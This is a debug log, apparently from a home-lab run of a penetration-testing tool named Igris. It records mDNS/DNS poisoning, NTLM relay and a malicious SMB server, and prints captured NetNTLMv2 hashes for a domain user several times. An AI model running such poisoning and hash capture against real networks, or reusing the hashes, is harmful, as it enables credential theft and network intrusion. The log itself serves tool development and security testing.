2021-11-07 11:27:37.588 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:390 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
2021-11-12 15:09:09.432 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:09.433 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:09.437 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:09.438 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:10.412 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:10.413 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:10.413 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:09:10.451 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:10.452 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:10.452 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:09:26.688 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:26.689 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:26.689 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:09:26.738 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:26.739 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:26.740 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:09:26.786 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:26.786 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:26.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:26.791 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:27.693 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:27.694 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:27.700 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:27.700 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:27.702 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49845)
2021-11-12 15:09:27.703 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.651 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:09:28.651 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.652 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:09:28.652 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.652 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:0428486f3263e077ac17c4c3b137a270:010100000000000000c46449d7d7d70187ba69d18868fe3500000000010010004400590065006d004400760074006f00030010004400590065006d004400760074006f00020010004400790078006200450043004b004800040010004400790078006200450043004b0048000700080000c46449d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000
2021-11-12 15:09:28.653 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.653 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:48 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:09:28.654 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-12 15:09:28.654 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.670 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-12 15:09:28.670 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.684 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-12 15:09:28.686 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:28.783 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:09:28.784 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:43.780 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-12 15:09:43.781 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:43.787 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49845)
2021-11-12 15:09:43.787 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:43.788 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-12 15:09:43.789 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:46.338 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:11:12.851 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:11:12.853 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:11:12.857 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:11:12.864 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:11:12.865 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:11:12.869 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:11:12.870 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:12.871 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:11:12.871 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:12.874 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:11:12.874 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:18.702 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.703 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.703 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:11:18.735 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.735 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.735 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:11:18.779 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.784 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.785 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.925 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.926 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.929 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.929 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.932 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.932 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:18.934 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:18.935 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:19.711 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49857)
2021-11-12 15:11:19.711 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.718 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:11:19.719 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.719 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:11:19.720 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.720 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:195a18d7c820c26a4fbbde1c9cf11a36:010100000000000080058e8bd7d7d7016ed12b2f5d8b78d8000000000100100049004e007400510077004e00440061000300100049004e007400510077004e0044006100020010005500550070007100650073005600530004001000550055007000710065007300560053000700080080058e8bd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000
2021-11-12 15:11:19.721 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.721 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:11:19.722 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-12 15:11:19.722 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.739 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:11:19.739 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:19.929 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:19.930 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:19.931 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:19.932 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:19.934 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:19.934 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:19.935 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:19.936 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:21.257 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-12 15:11:21.258 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:21.272 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-12 15:11:21.273 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:23.290 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:11:47.382 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:11:47.383 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:11:47.388 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:11:47.396 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:11:47.397 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:11:47.408 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:11:47.409 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:47.410 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:11:47.411 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:47.411 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:11:47.413 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:51.859 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:51.859 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:51.860 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:11:51.895 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:51.895 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:51.895 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:11:51.927 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:51.927 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:51.928 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:51.928 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:52.853 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:52.854 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:52.861 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:52.863 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:11:52.864 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49858)
2021-11-12 15:11:52.865 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:52.891 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:11:52.891 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:52.892 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:11:52.892 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:52.893 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000
2021-11-12 15:11:52.893 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - []
2021-11-12 15:11:52.894 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:11:52.914 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:11:52.915 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:44 - ['benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:32f615db865aba65fe76f8e3bb69b97c:0101000000000000006c399fd7d7d701e9035b3a8b3d5a270000000001001000450047005100480061004b006f00650003001000450047005100480061004b006f006500020010006d00770070006c004e0064004c004300040010006d00770070006c004e0064004c00430007000800006c399fd7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002c0063006900660073002f0069006e00740065006e0074006f006200690065006e002e006c006f00630061006c000000000000000000']
2021-11-12 15:11:58.212 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:11:58.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
